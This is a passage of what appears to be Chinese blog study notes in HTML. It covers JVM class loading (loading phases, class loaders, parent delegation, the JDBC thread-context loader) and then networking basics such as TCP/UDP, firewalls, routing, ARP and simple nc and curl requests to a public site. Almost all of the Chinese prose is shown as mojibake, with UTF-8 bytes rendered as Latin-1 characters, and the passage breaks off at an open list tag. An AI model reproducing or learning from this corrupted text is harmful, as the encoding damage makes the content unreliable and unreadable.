<p>ä¸€ä¸ªéæ•°ç»„ç±»çš„åŠ è½½é˜¶æ®µï¼ˆåŠ è½½é˜¶æ®µè·å–ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµçš„åŠ¨ä½œï¼‰æ˜¯å¯æ§æ€§æœ€å¼ºçš„é˜¶æ®µï¼Œè¿™ä¸€æ­¥æˆ‘ä»¬å¯ä»¥å»å®Œæˆè¿˜å¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»æ§åˆ¶å­—èŠ‚æµçš„è·å–æ–¹å¼ï¼ˆé‡å†™ä¸€ä¸ªç±»åŠ è½½å™¨çš„ loadClass() æ–¹æ³•ï¼‰ã€‚æ•°ç»„ç±»å‹ä¸é€šè¿‡ç±»åŠ è½½å™¨åˆ›å»ºï¼Œå®ƒç”± Java è™šæ‹Ÿæœºç›´æ¥åˆ›å»ºã€‚</p>
<h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><p>éªŒè¯æ–‡ä»¶æ˜¯å¦ç¬¦åˆJVMè§„èŒƒ</p>
<p> æ–‡ä»¶æ ¼å¼éªŒè¯(ç±»å,ä¸»æ¬¡ç‰ˆæœ¬å·); å…ƒæ•°æ®éªŒè¯(å¯¹å­—èŠ‚ç æè¿°ä¿¡æ¯è¿›è¡Œè¯­ä¹‰åˆ†æ,final); å­—èŠ‚ç éªŒè¯(æœ€å¤æ‚çš„é˜¶æ®µ,ç¡®å®šç¨‹åºè¯­ä¹‰æ˜¯åˆæ³•çš„ã€ç¬¦åˆé€»è¾‘çš„); ç¬¦å·å¼•ç”¨éªŒè¯(ç¡®ä¿è§£æåŠ¨ä½œèƒ½æ­£ç¡®æ‰§è¡Œ)</p>
<h3 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h3><p>é™æ€å˜é‡èµ‹åˆå§‹å€¼</p>
<p>ç»™staticèµ‹é»˜è®¤å€¼,å¦‚æœåŠ äº†finalå…³é”®å­—å°±æ˜¯èµ‹æŒ‡å®šçš„å€¼;</p>
<h3 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h3><p>å°†ç±»ã€å±æ€§ã€æ–¹æ³•ç­‰ç¬¦å·å¼•ç”¨è§£æä¸ºç›´æ¥é¥®ç”¨ï¼Œå¸¸é‡æ± ä¸­çš„å„ç§ç¬¦å·å¼•ç”¨è§£æä¸ºæŒ‡é’ˆã€åç§»é‡ç­‰å†…å­˜åœ°å€çš„ç›´æ¥å¼•ç”¨</p>
<p>è®²å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹; è§£æåŠ¨ä½œä¸»è¦é’ˆå¯¹ç±»æˆ–æ¥å£ã€å­—æ®µã€ç±»æ–¹æ³•ã€æ¥å£æ–¹æ³•ã€æ–¹ç±»å‹ã€æ–¹æ³•å¥æŸ„å’Œè°ƒç”¨é™å®šç¬¦7ç±»ç¬¦å·å¼•ç”¨è¿›è¡Œ; </p>
<p>ç¬¦å·å¼•ç”¨å°±æ˜¯ä¸€ç»„ç¬¦å·æ¥æè¿°ç›®æ ‡ï¼Œå¯ä»¥æ˜¯ä»»ä½•å­—é¢é‡ã€‚<strong>ç›´æ¥å¼•ç”¨</strong>å°±æ˜¯ç›´æ¥æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–ä¸€ä¸ªé—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚åœ¨ç¨‹åºå®é™…è¿è¡Œæ—¶ï¼Œåªæœ‰ç¬¦å·å¼•ç”¨æ˜¯ä¸å¤Ÿçš„ï¼Œä¸¾ä¸ªä¾‹å­ï¼šåœ¨ç¨‹åºæ‰§è¡Œæ–¹æ³•æ—¶ï¼Œç³»ç»Ÿéœ€è¦æ˜ç¡®çŸ¥é“è¿™ä¸ªæ–¹æ³•æ‰€åœ¨çš„ä½ç½®ã€‚Java è™šæ‹Ÿæœºä¸ºæ¯ä¸ªç±»éƒ½å‡†å¤‡äº†ä¸€å¼ æ–¹æ³•è¡¨æ¥å­˜æ”¾ç±»ä¸­æ‰€æœ‰çš„æ–¹æ³•ã€‚å½“éœ€è¦è°ƒç”¨ä¸€ä¸ªç±»çš„æ–¹æ³•çš„æ—¶å€™ï¼Œåªè¦çŸ¥é“è¿™ä¸ªæ–¹æ³•åœ¨æ–¹æ³•è¡¨ä¸­çš„åç§»é‡å°±å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥æ–¹æ³•äº†ã€‚é€šè¿‡è§£ææ“ä½œç¬¦å·å¼•ç”¨å°±å¯ä»¥ç›´æ¥è½¬å˜ä¸ºç›®æ ‡æ–¹æ³•åœ¨ç±»ä¸­æ–¹æ³•è¡¨çš„ä½ç½®ï¼Œä»è€Œä½¿å¾—æ–¹æ³•å¯ä»¥è¢«è°ƒç”¨ã€‚</p>
<h3 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h3><p>æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•<clinit>()æ–¹æ³•çš„è¿‡ç¨‹; è¿™ä¸ªæ–¹æ³•æ˜¯å¸¦é”çº¿ç¨‹å®‰å…¨çš„,åœ¨å¤šçº¿ç¨‹çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šå¼•å‘æ­»é”,è¿™ç§æ­»é”æ˜¯å¾ˆéš¾å‘ç°çš„; </p>
<p>è™šæ‹Ÿæœºä¸¥æ ¼è§„èŒƒäº†ä¸‹é¢å‡ ç§æƒ…å†µä¸‹å¿…é¡»å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–</p>
<p>1.å½“é‡åˆ°newã€getstaticã€putstaticã€invokestaticè¿™4æ¡å­—èŠ‚ç æŒ‡ä»¤æ—¶</p>
<p>2.ä½¿ç”¨åå°„æ—¶</p>
<p>3.åˆå§‹åŒ–ä¸€ä¸ªç±»,å¦‚æœå…¶çˆ¶ç±»è¿˜æ²¡æœ‰åˆå§‹åŒ–,åˆ™å…ˆå‡ºå‘è¯¥çˆ¶ç±»çš„åˆå§‹åŒ–</p>
<p>4.å½“è™šæ‹Ÿæœºå¯åŠ¨æ—¶,ç”¨æˆ·éœ€è¦å®šä¹‰ä¸€ä¸ªæ‰§è¡Œçš„ä¸»ç±»,è™šæ‹Ÿæœºä¹å…ˆåˆå§‹åŒ–è¿™ä¸ªç±»</p>
<p>5.MethodHandleå’ŒVarHandleå¯ä»¥çœ‹ä½œæ˜¯è½»é‡çº§çš„åå°„è°ƒç”¨æœºåˆ¶,è¦æƒ³ä½¿ç”¨è¿™ä¸¤ä¸ªè°ƒç”¨,å°±å¿…é¡»å…ˆä½¿ç”¨findstaticVarHandleæ¥åˆå§‹åŒ–è¦è°ƒç”¨çš„ç±»</p>
<p>6.å½“ä¸€ä¸ªæ¥å£ä¸­å®šä¹‰äº†JDK8æ–°åŠ å…¥çš„é»˜è®¤æ–¹æ³•(è¢«defaultå…³é”®å­—ä¿®é¥°çš„æ¥å£æ–¹æ³•)æ—¶,å¦‚æœæœ‰è¿™ä¸ªæ¥å£çš„å®ç°ç±»å‘ç”Ÿäº†åˆå§‹åŒ–,é‚£è¯¥æ¥å£è¦åœ¨å…¶ä¹‹å‰è¢«åˆå§‹åŒ–</p>
<h3 id="å¸è½½"><a href="#å¸è½½" class="headerlink" title="å¸è½½"></a>å¸è½½</h3><p>å¸è½½ç±»å³è¯¥ç±»çš„Classå¯¹è±¡è¢«GC</p>
<p>å¸è½½ç±»éœ€è¦æ»¡è¶³3ä¸ªæ¡ä»¶</p>
<p>1.è¯¥ç±»çš„æ‰€æœ‰å®ä¾‹å¯¹è±¡éƒ½å·²è¢«GC,ä¹Ÿå°±æ˜¯è¯´å †ä¸å­˜åœ¨è¯¥ç±»çš„å®ä¾‹å¯¹è±¡</p>
<p>2.è¯¥ç±»æ²¡æœ‰åœ¨å…¶ä»–åœ°æ–¹åˆ«å¼•ç”¨</p>
<p>3.è¯¥ç±»çš„ç±»åŠ è½½å™¨çš„å®ä¾‹å·²è¢«GC</p>
<p>æ‰€ä»¥ï¼Œåœ¨JVMç”Ÿå‘½å‘¨æœŸç±»ï¼Œç”±jvmè‡ªå¸¦çš„ç±»åŠ è½½å™¨åŠ è½½çš„ç±»æ˜¯ä¸ä¼šè¢«å¸è½½çš„ã€‚ä½†æ˜¯ç”±æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½çš„ç±»æ˜¯å¯èƒ½è¢«å¸è½½çš„ã€‚</p>
<p>åªè¦æƒ³é€šä¸€ç‚¹å°±å¥½äº†ï¼Œjdkè‡ªå¸¦çš„BootstrapClassLoader, ExtClassLoader, AppClassLoaderè´Ÿè´£åŠ è½½jdkæä¾›çš„ç±»ï¼Œæ‰€ä»¥å®ƒä»¬(ç±»åŠ è½½å™¨çš„å®ä¾‹)è‚¯å®šä¸ä¼šè¢«å›æ”¶ã€‚è€Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨çš„å®ä¾‹æ˜¯å¯ä»¥è¢«å›æ”¶çš„ï¼Œæ‰€ä»¥ä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰åŠ è½½å™¨åŠ è½½çš„ç±»æ˜¯å¯ä»¥è¢«å¸è½½æ‰çš„ã€‚</p>
<h2 id="ç±»åŠ è½½å™¨"><a href="#ç±»åŠ è½½å™¨" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h2><p>java.lang.ClassLoaderå†…ç½®äº†ä¸‰ä¸ªClassLoader</p>
<p>BootstrapClassLoader(å¯åŠ¨ç±»åŠ è½½å™¨): æœ€é¡¶å±‚çš„åŠ è½½ç±»,ç”±C++å®ç°,è´Ÿè´£åŠ è½½%JAVA_HOME%&#x2F;libç›®å½•ä¸‹çš„jaråŒ…å’Œç±»æˆ–è€…è¢«-Xbootclasspathå‚æ•°æŒ‡å®šè·¯å¾„ä¸­çš„æ‰€æœ‰ç±»;</p>
<p>ExtensionClassLoader(æ‰©å±•ç±»åŠ è½½å™¨): ä¸»è¦è´Ÿè´£åŠ è½½ç›®å½•%JRE_HOME%&#x2F;lib&#x2F;extç›®å½•ä¸‹çš„jaråŒ…å’Œç±»,æˆ–è¢«java.ext.dirsç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸‹çš„jaråŒ…</p>
<p>AppClassLoader(åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨): é¢å‘æˆ‘ä»¬ç”¨æˆ·çš„åŠ è½½å™¨,è´Ÿè´£åŠ è½½å½“å‰åº”ç”¨classpathä¸‹çš„æ‰€æœ‰jaråŒ…å’Œç±»</p>
<h3 id="åŒäº²å§”æ´¾æ¨¡å‹"><a href="#åŒäº²å§”æ´¾æ¨¡å‹" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å‹"></a>åŒäº²å§”æ´¾æ¨¡å‹</h3><p>æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªå¯¹åº”å®ƒçš„ç±»åŠ è½½å™¨; ç³»ç»Ÿä¸­çš„ClassLoaderåœ¨ååŒå·¥ä½œçš„æ—¶å€™ä¼šé»˜è®¤ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹. å³åœ¨ç±»åŠ è½½çš„æ—¶å€™, ç³»ç»Ÿä¼šé¦–å…ˆåˆ¤æ–­å½“å‰ç±»æ˜¯å¦è¢«åŠ è½½è¿‡. å·²ç»è¢«åŠ è½½çš„ç±»ä¼šç›´æ¥è¿”å›,å¦åˆ™æ‰ä¼šå°è¯•åŠ è½½. åŠ è½½çš„æ—¶å€™,ä¼šæŠŠè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨çš„loadClass() å¤„ç†, å› æ­¤æ‰€æœ‰è¯·æ±‚æœ€ç»ˆéƒ½åº”è¯¥ä¼ é€åˆ°é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨.å½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•å¤„ç†æ—¶,æ‰ç”±è‡ªå·±æ¥å¤„ç†. å½“çˆ¶ç±»åŠ è½½å™¨ä¸ºnullæ—¶,ä¼šä½¿ç”¨å¯åŠ¨ç±»åŠ è½½å™¨bootstrapClassLoaderä½œä¸ºçˆ¶ç±»åŠ è½½å™¨.</p>
<h3 id="åŒäº²å§”æ´¾æ¨¡å‹çš„å¥½å¤„"><a href="#åŒäº²å§”æ´¾æ¨¡å‹çš„å¥½å¤„" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å‹çš„å¥½å¤„"></a>åŒäº²å§”æ´¾æ¨¡å‹çš„å¥½å¤„</h3><p>å¯ä»¥ä¿è¯javaç¨‹åºçš„ç¨³å®šè¿è¡Œ,å¯ä»¥é¿å…ç±»çš„é‡å¤åŠ è½½(JVMåŒºåˆ†ä¸åŒç±»çš„æ–¹å¼ä¸ä»…ä»…æ ¹æ®ç±»å, ç›¸åŒçš„ç±»æ–‡ä»¶è¢«ä¸åŒçš„ç±»åŠ è½½å™¨åŠ è½½äº§ç”Ÿçš„æ˜¯ä¸¤ä¸ªä¸åŒçš„ç±»),ä¹Ÿä¿è¯äº†Javaæ ¸å¿ƒAPIä¸è¢«ç¯¡æ”¹; å¦‚æœæ²¡æœ‰ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹,è€Œæ˜¯æ¯ä¸ªç±»åŠ è½½å™¨åŠ è½½è‡ªå·±çš„è¯å°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜,æ¯”å¦‚æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªjava.lang.Objectç±»çš„è¯,é‚£ä¹ˆç¨‹åºè¿è¡Œçš„æ—¶å€™,ç³»ç»Ÿå°±ä¼šå‡ºç°å¤šä¸ªä¸åŒçš„Objectç±»</p>
<h3 id="å¦‚æœæˆ‘ä»¬ä¸æƒ³ç”¨åŒäº²å§”æ´¾æ¨¡å‹æ€ä¹ˆåŠ"><a href="#å¦‚æœæˆ‘ä»¬ä¸æƒ³ç”¨åŒäº²å§”æ´¾æ¨¡å‹æ€ä¹ˆåŠ" class="headerlink" title="å¦‚æœæˆ‘ä»¬ä¸æƒ³ç”¨åŒäº²å§”æ´¾æ¨¡å‹æ€ä¹ˆåŠ?"></a>å¦‚æœæˆ‘ä»¬ä¸æƒ³ç”¨åŒäº²å§”æ´¾æ¨¡å‹æ€ä¹ˆåŠ?</h3><p>è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„è¯,éœ€è¦ç»§æ‰¿ClassLoader. å¦‚æœæˆ‘ä»¬ä¸æƒ³æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹,å°±é‡å†™ClassLoaderç±»ä¸­çš„findClass()æ–¹æ³•å³å¯,æ— æ³•è¢«çˆ¶ç±»åŠ è½½å™¨åŠ è½½çš„ç±»æœ€ç»ˆä¼šé€šè¿‡è¿™ä¸ªæ–¹æ³•è¢«åŠ è½½. ä½†æ˜¯,å¦‚æœè¦æ‰“ç ´åŒäº²å§”æ´¾æœºåˆ¶æ¨¡å‹åˆ™éœ€è¦é‡å†™loadClass()æ–¹æ³•.</p>
<p>ç ´åæ€§åŒäº²å§”æ´¾æ¨¡å‹çš„ç»å…¸æ¡ˆä¾‹ï¼ˆJDBCï¼‰<br>åŸç”Ÿçš„JDBCä¸­Driveré©±åŠ¨æœ¬èº«åªæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¹¶æ²¡æœ‰å…·ä½“çš„å®ç°ï¼Œå…·ä½“çš„å®ç°æ˜¯ç”±ä¸åŒæ•°æ®åº“ç±»å‹å»å®ç°çš„ã€‚ä¾‹å¦‚ï¼ŒMySQLçš„mysql-connector-.jarä¸­çš„Driverç±»å…·ä½“å®ç°çš„ã€‚ åŸç”Ÿçš„JDBCä¸­çš„ç±»æ˜¯æ”¾åœ¨rt.jaråŒ…çš„ï¼Œæ˜¯ç”±å¯åŠ¨ç±»åŠ è½½å™¨è¿›è¡Œç±»åŠ è½½çš„ï¼Œåœ¨JDBCä¸­çš„Driverç±»ä¸­éœ€è¦åŠ¨æ€å»åŠ è½½ä¸åŒæ•°æ®åº“ç±»å‹çš„Driverç±»ï¼Œè€Œmysql-connector-.jarä¸­çš„Driverç±»æ˜¯ç”¨æˆ·è‡ªå·±å†™çš„ä»£ç ï¼Œé‚£å¯åŠ¨ç±»åŠ è½½å™¨è‚¯å®šæ˜¯ä¸èƒ½è¿›è¡ŒåŠ è½½çš„ï¼Œæ—¢ç„¶æ˜¯è‡ªå·±ç¼–å†™çš„ä»£ç ï¼Œé‚£å°±éœ€è¦ç”±åº”ç”¨ç¨‹åºå¯åŠ¨ç±»å»è¿›è¡Œç±»åŠ è½½ã€‚äºæ˜¯ä¹ï¼Œè¿™ä¸ªæ—¶å€™å°±å¼•å…¥çº¿ç¨‹ä¸Šä¸‹æ–‡ä»¶ç±»åŠ è½½å™¨(Thread Context ClassLoader)ã€‚æœ‰äº†è¿™ä¸ªä¸œè¥¿ä¹‹åï¼Œç¨‹åºå°±å¯ä»¥æŠŠåŸæœ¬éœ€è¦ç”±å¯åŠ¨ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½çš„ç±»ï¼Œç”±åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨å»è¿›è¡ŒåŠ è½½äº†ã€‚</p>
<h3 id="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰ç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</h3><p>é™¤äº†BootstrapClassLoaderå…¶ä»–ç±»åŠ è½½å™¨å‡ç”±javaå®ç°,ä¸”å…¨éƒ¨ç»§æ‰¿è‡ªjava.lang.ClassLoader. å¦‚æœè¦å®šä¹‰è‡ªå·±çš„ç±»åŠ è½½å™¨,å°±éœ€è¦ç»§æ‰¿ClassLoader.</p>
<h1 id="è®¡ç®—æœºç½‘ç»œ"><a href="#è®¡ç®—æœºç½‘ç»œ" class="headerlink" title="è®¡ç®—æœºç½‘ç»œ"></a>è®¡ç®—æœºç½‘ç»œ</h1><p>æœ‰çŠ¶æ€ï¼š<br>Aï¼šä½ ä»Šå¤©ä¸­åˆåƒçš„å•¥ï¼Ÿ<br>Bï¼šåƒçš„å¤§ç›˜é¸¡ã€‚<br>Aï¼šå‘³é“æ€ä¹ˆæ ·å‘€ï¼Ÿ<br>Bï¼šè¿˜ä¸é”™ï¼ŒæŒºå¥½åƒçš„ã€‚</p>
<p>æ— çŠ¶æ€ï¼š<br>Aï¼šä½ ä»Šå¤©ä¸­åˆåƒçš„å•¥ï¼Ÿ<br>Bï¼šåƒçš„å¤§ç›˜é¸¡ã€‚<br>Aï¼šå‘³é“æ€ä¹ˆæ ·å‘€ï¼Ÿ<br>Bï¼šï¼Ÿï¼Ÿï¼Ÿå•Šï¼Ÿå•¥ï¼Ÿå•¥å‘³é“æ€ä¹ˆæ ·ï¼Ÿ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848125.png" alt="img"></p>
<p>åœ¨å‘é€æ–¹ï¼ŒSSLæ¥å—åº”ç”¨å±‚çš„æ•°æ®ï¼ˆå¦‚httpæˆ–IMapæŠ¥æ–‡ï¼‰ï¼Œå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œç„¶åæŠŠåŠ äº†å¯†çš„æ•°æ®é€å¾€TCPå¥—æ¥å­—ã€‚ åœ¨æ¥å—æ–¹ï¼ŒSSLä»TCPå¥—æ¥å­—è¯»å–æ•°æ®ï¼Œè§£å¯†åæŠŠæ•°æ®äº¤ç»™åº”ç”¨å±‚ã€‚</p>
<p>åœ¨Internetä¸Šä¼ è¾“éŸ³é¢‘è§†é¢‘é¢ä¸´çš„é—®é¢˜ï¼Ÿ å ç”¨çš„å¸¦å®½é«˜ï¼Œç½‘é€Ÿéœ€è¦æ’å®šï¼Œå»¶è¿Ÿä½ï¼Œæ•°æ®ä¿¡æ¯ã€‚</p>
<p>ç½‘ç»œå±‚é˜²ç«å¢™ï¼šåŸºäºæ•°æ®åŒ…ï¼Œæºåœ°å€ ç›®æ ‡åœ°å€ï¼Œåè®®å’Œç«¯å£ï¼Œæ§åˆ¶æµé‡</p>
<p>åº”ç”¨å±‚é˜²ç«å¢™ï¼šæ•°æ®åŒ… åŸåœ°å€ ç›®æ ‡åœ°å€ åè®® ç«¯å£ ç”¨æˆ·å æ—¶é—´æ®µ å†…å®¹ é˜²ç—…æ¯’è¿›å…¥å†…ç½‘</p>
<p>QOS(quality of service)</p>
<p>TCPåè®®æ˜¯ä¸€ä¸ªé¢å‘è¿æ¥çš„ã€å¯é çš„ä¼ è¾“åè®®ï¼Œå®ƒæä¾›ä¸€ç§å¯é çš„å­—èŠ‚æµï¼Œèƒ½ä¿è¯æ•°æ®å®Œæ•´ã€æ— æŸå¹¶ä¸”æŒ‰é¡ºåºåˆ°è¾¾ã€‚TCPå°½é‡è¿ç»­ä¸æ–­åœ°æµ‹è¯•ç½‘ç»œçš„è´Ÿè½½å¹¶ä¸”æ§åˆ¶å‘é€æ•°æ®çš„é€Ÿåº¦ä»¥é¿å…ç½‘ç»œè¿‡è½½ã€‚å¦å¤–ï¼ŒTCPè¯•å›¾å°†æ•°æ®æŒ‰ç…§è§„å®šçš„é¡ºåºå‘é€ã€‚</p>
<p>UDPåè®®æ˜¯ä¸€ä¸ªæ— è¿æ¥çš„æ•°æ®æŠ¥åè®®ï¼Œæ˜¯ä¸€ä¸ªâ€œå°½åŠ›ä¼ é€’â€å’Œâ€œä¸å¯é â€åè®®ï¼Œä¸ä¼šå¯¹æ•°æ®åŒ…æ˜¯å¦å·²ç»åˆ°è¾¾ç›®çš„åœ°è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶ä¸”ä¸ä¿è¯æ•°æ®åŒ…æŒ‰é¡ºåºåˆ°è¾¾ã€‚</p>
<p>æ€»ä½“æ¥è¯´ï¼ŒTCPåè®®ä¼ è¾“æ•ˆç‡ä½ï¼Œä½†å¯é æ€§å¼ºï¼›UDPåè®®ä¼ è¾“æ•ˆç‡é«˜ï¼Œä½†å¯é æ€§ç•¥ä½ï¼Œé€‚ç”¨äºä¼ è¾“å¯é æ€§è¦æ±‚ä¸é«˜ã€ä½“é‡å°çš„æ•°æ®ï¼ˆæ¯”å¦‚QQèŠå¤©æ•°æ®ï¼‰ã€‚</p>
<p>é›†çº¿å™¨: æ— è„‘è½¬å‘,é€šè¿‡æŸ¥çœ‹macçœ‹æ˜¯å¦æ˜¯ç»™è‡ªå·±çš„æ•°æ®åŒ…,ä¸æ˜¯å°±ä¸¢å¼ƒ</p>
<p>äº¤æ¢æœº: å¯ä»¥è‡ªå­¦ä¹ ,èƒ½å¤Ÿé€šè¿‡macåœ°å€å®šå‘è½¬å‘</p>
<p>é»˜è®¤ç½‘å…³: å°±æ˜¯åœ¨è‡ªå·±ç”µè„‘é‡Œé…ç½®çš„ä¸€ä¸ª IP åœ°å€ï¼Œä»¥ä¾¿åœ¨å‘ç»™ä¸åŒå­ç½‘çš„æœºå™¨æ—¶ï¼Œå‘ç»™è¿™ä¸ª IP åœ°å€ã€‚</p>
<p>arp : æ¯å°ç”µè„‘éƒ½æœ‰ä¸€ä¸ªarpç¼“å­˜è¡¨,ç”µè„‘ A ä¸ºäº†çŸ¥é“ç”µè„‘ Bï¼ˆ192.168.0.2ï¼‰çš„ MAC åœ°å€ï¼Œå°†ä¼š<strong>å¹¿æ’­</strong>ä¸€æ¡ arp è¯·æ±‚ï¼ŒB æ”¶åˆ°è¯·æ±‚åï¼Œå¸¦ä¸Šè‡ªå·±çš„ MAC åœ°å€ç»™ A ä¸€ä¸ª<strong>å“åº”</strong>ã€‚æ­¤æ—¶ A ä¾¿æ›´æ–°äº†è‡ªå·±çš„ arp è¡¨ã€‚</p>
<p>Vpn: æ•°æ®åŒ…é‡ŒåŒ…å«æ•°æ®åŒ…</p>
<h2 id="é©¬å£«å…µ"><a href="#é©¬å£«å…µ" class="headerlink" title="é©¬å£«å…µ"></a>é©¬å£«å…µ</h2><p>æœ‰å¯èƒ½ack+finåŒ…ä¸€èµ·å‘, 4æ¬¡æŒ¥æ‰‹çš„æ—¶å€™å¯èƒ½åªæŠ“åˆ°3ä¸ªåŒ…;</p>
<p>61.135.169.121 å…ˆå’Œè·¯ç”±è¡¨çš„ç¬¬ä¸€ä¸ªmaskåšæŒ‰ä½ä¸,ç„¶åä¸ç½‘ç»œå·192.168.150.0å¯¹æ¯”, ä¸å¯¹; ç„¶åè¿™æ¡è®°å½•ä½œåºŸ;</p>
<p>å†å’Œ0.0.0.0åšæŒ‰ä½ä¸, ç­‰äºdestination, ç„¶åçŸ¥é“åº”è¯¥è½¬å‘åˆ°192.168.150.2, ä½†æ˜¯è¿™ä¸ªä¸èƒ½æŠŠç›®æ ‡åœ°å€ç›´æ¥æ”¹ä¸º192.168.150.2, è¿™ä¸ªæ—¶å€™å°±éœ€è¦æ•°æ®é“¾è·¯å±‚, åœ¨æ•°æ®é“¾è·¯å±‚å†å¥—ä¸€å±‚macåœ°å€;</p>
<p>ipåœ°å€æ˜¯ä¸€ç›´ä¸å˜çš„,macåœ°å€ä¸€ç›´åœ¨æ›¿æ¢, ipæ˜¯ç«¯åˆ°ç«¯, macåœ°å€æ˜¯èŠ‚ç‚¹åˆ°èŠ‚ç‚¹ä¹‹é—´;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848243.png" alt="æˆªå±2021-05-14 ä¸‹åˆ8.38.07"></p>
<p>åœ¨ç‰©ç†å±‚ä¼šå…ˆåŠ ä¸€ä¸ªå‰å¯¼ç , å‰å¯¼ç çš„ä½œç”¨å°±æ˜¯å‘Šè¯‰æ¥æ”¶ç«¯æ¥ä¸‹æ¥çš„æ•°æ®æ˜¯å¸§æ•°æ®ï¼Œå®ƒæ˜¯ç”¨æ¥åˆ†éš”ä¸¤ä¸ªå¸§çš„æ ‡å¿—ã€‚ä¸€æ˜¯è®©æ¥æ”¶ç«¯å¿«é€Ÿåˆ¤æ–­æ¥æ”¶åˆ°çš„ä¸€å¸§æ•°æ®æ ¼å¼æ˜¯å¦æ˜¯æ­£ç¡®çš„ï¼Œå› ä¸ºæ¯ä¸€å¸§å¿…ç„¶æ˜¯å‰å¯¼ç å¼€å¤´ï¼Œå¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆæ•°æ®è‚¯å®šæœ‰é—®é¢˜ã€‚äºŒæ˜¯åœ¨å‘ç°æ•°æ®æœ‰é—®é¢˜æ—¶ï¼Œèƒ½å¤Ÿå¿«é€Ÿæ‰¾åˆ°ä¸‹ä¸€å¸§çš„èµ·å§‹ç‚¹ï¼Œä»è€ŒçŸ¥é“è¦ä¸¢å¼ƒå¤šå°‘é”™è¯¯æ•°æ®ã€‚</p>
<p>nc <a href="http://www.baidu.com/">www.baidu.com</a> 80</p>
<p>ç›¸å½“äºæµè§ˆå™¨é“¾æ¥ä¸Šäº†ç™¾åº¦çš„80ç«¯å£,ç„¶åæŒ‰ç…§httpåè®®å‘é€ä¸œè¥¿è¿‡å», å®ƒå°±ä¼šå›å¤</p>
<p>curl <a href="http://www.baidu.com/">www.baidu.com:80</a></p>
<p>curlç›¸å½“äºå°è£…äº†å¥½å‡ ä¸ªæŒ‡ä»¤, ç›´æ¥è®¿é—®ç™¾åº¦,ç„¶åæ–­å¼€, èµ°å®Œæ•´ä¸ªç”Ÿå‘½å‘¨æœŸ;</p>
<h3 id="ARPè¿‡ç¨‹"><a href="#ARPè¿‡ç¨‹" class="headerlink" title="ARPè¿‡ç¨‹"></a>ARPè¿‡ç¨‹</h3><p>ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰</p>
<p>åœ¨å±€åŸŸç½‘ä¸­ï¼Œå½“ä¸»æœºæˆ–å…¶å®ƒç½‘ç»œè®¾å¤‡æœ‰æ•°æ®è¦å‘é€ç»™å¦ä¸€ä¸ªä¸»æœºæˆ–è®¾å¤‡æ—¶ï¼Œå®ƒå¿…é¡»çŸ¥é“å¯¹æ–¹çš„ç½‘ç»œå±‚åœ°å€ï¼ˆå³IPåœ°å€ï¼‰ã€‚ä½†æ˜¯ä»…ä»…æœ‰IPåœ°å€æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºIPæ•°æ®æŠ¥æ–‡å¿…é¡»å°è£…æˆå¸§æ‰èƒ½é€šè¿‡ç‰©ç†ç½‘ç»œå‘é€ï¼Œå› æ­¤å‘é€ç«™è¿˜å¿…é¡»æœ‰æ¥æ”¶ç«™çš„ç‰©ç†åœ°å€ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªä»IPåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ã€‚APRå°±æ˜¯å®ç°è¿™ä¸ªåŠŸèƒ½çš„åè®®ã€‚</p>
<p> å‡è®¾ä¸»æœºAå’ŒBåœ¨ï¼Œä¸»æœºAè¦å‘ä¸»æœºBå‘é€ä¿¡æ¯ã€‚å…·ä½“çš„åœ°å€è§£æè¿‡ç¨‹å¦‚ä¸‹  </p>
<ul>
